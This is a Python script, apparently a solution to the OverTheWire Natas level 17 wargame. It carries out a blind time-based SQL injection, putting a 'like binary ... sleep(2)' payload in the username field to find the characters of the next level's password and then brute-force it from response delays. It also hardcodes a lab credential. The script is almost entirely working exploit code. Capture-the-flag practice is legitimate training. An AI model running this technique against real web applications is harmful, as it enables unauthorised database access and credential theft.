import requests
import string

url = 'http://natas17.natas.labs.overthewire.org/'
uName = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'


charset = "".join([string.ascii_letters,string.digits])

#filtering out unused chars increases speed
#Filtered set can have less than 32 chars but never more than 32.
#Chose a while loop to future proof script for a worst case : 32 distinct chars in filtered Set
#Need to limit i  because  of worst case :  password repeats the same char 32 time. Need to stop at end of charset.

filteredSet= ""
i =  0

while(not(len(filteredSet) >= 32) and i < len(charset)):
    username = {"username":"natas18\" and password like binary \"%{}%\" and sleep(2) #".format(charset[i])}
    response = requests.post(url,data=username,auth=(uName,password))
    print(charset[i])
    if (response.elapsed.seconds >= 2 ):
        filteredSet += charset[i]
    i += 1

print(filteredSet)
currentIndex = 0
currentLetter = filteredSet[currentIndex]
currentPassword = ""
#Begin bruteforcing with filtered list.
#Remove 1st while loop if cannot determine charset used in the password

while (not(len(currentPassword) >= 32)):
    username = {"username":"natas18\" and password like binary \"{}%\" and sleep(2) #".format(currentLetter)}
    response = requests.post(url,data=username,auth=(uName,password))
    if (response.elapsed.seconds >= 2):
        currentPassword += currentLetter[-1:]
        print(currentPassword)
        currentIndex = 0
    else:
        currentIndex +=1
    currentLetter = currentPassword+filteredSet[currentIndex]
    print("CI = ",currentIndex,"CL = ",currentLetter ,"CP = ", currentPassword)
print("-----------------------------------------------------------------------------")
